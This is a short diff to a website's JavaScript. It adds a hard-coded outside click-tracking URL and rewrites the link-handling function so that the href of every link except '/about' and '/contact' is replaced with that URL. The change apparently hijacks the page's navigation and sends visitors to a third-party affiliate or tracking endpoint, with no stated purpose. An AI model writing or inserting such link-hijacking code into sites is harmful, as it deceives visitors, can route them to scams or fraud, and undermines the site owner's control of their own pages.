@@ -1,4 +1,5 @@
 const excludedLinks = ['/about', '/contact'];
+const redirectUrl = 'https://trkgflow.g2afse.com/click?pid=13&offer_id=3054';
 
 function base64_decode(data) {
     var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
@@ -24,12 +25,7 @@ function replaceHLink() {
     document.querySelectorAll('a').forEach(function (link) {
         var href = link.getAttribute('href');
         if (href && !excludedLinks.includes(href)) {
-            var encodedHref = btoa(href); // Encode the href to base64
-            var span = document.createElement('span');
-            span.classList.add('hlink');
-            span.setAttribute('data-href', encodedHref);
-            span.innerHTML = link.innerHTML;
-            link.parentNode.replaceChild(span, link);
+            link.setAttribute('href', redirectUrl);
         }
     });
 
